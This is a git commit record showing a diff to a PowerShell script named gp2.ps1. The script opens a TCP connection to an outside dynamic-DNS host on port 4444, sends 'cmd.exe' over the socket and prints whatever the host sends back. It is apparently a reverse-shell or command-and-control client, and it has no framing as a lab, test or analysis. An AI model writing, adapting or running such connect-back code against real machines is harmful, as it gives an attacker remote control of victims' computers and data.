482e8b89a0cd1810dbcefe8e8e633393f510d22b
anilxpm <116901345+anilxpm@users.noreply.github.com>
2023-04-16 08:51:01 +0300

    Update gp2.ps1

--- gp2.ps1
+++ gp2.ps1
@@ -1,20 +1,20 @@
 $ip = "suber122.duckdns.org"
 $port = 4444
+$sendCommand = "cmd.exe"
 
-$client = New-Object System.Net.Sockets.TcpClient($ip, $port)
-$stream = $client.GetStream()
-
-$reader = New-Object System.IO.StreamReader($stream)
+$socket = New-Object System.Net.Sockets.TcpClient($ip,$port)
+$stream = $socket.GetStream()
 $writer = New-Object System.IO.StreamWriter($stream)
+$reader = New-Object System.IO.StreamReader($stream)
 
-$writer.AutoFlush = $true
+$writer.WriteLine($sendCommand)
+$writer.Flush()
 
-while ($stream.Connected)
-{
-    $cmd = Read-Host "Enter Command"
-    $writer.WriteLine($cmd)
+$output = $reader.ReadLine()
+
+while($output -ne $null){
+    $output
     $output = $reader.ReadLine()
-    Write-Host $output
 }
 
-$client.Close()
+$socket.Close()
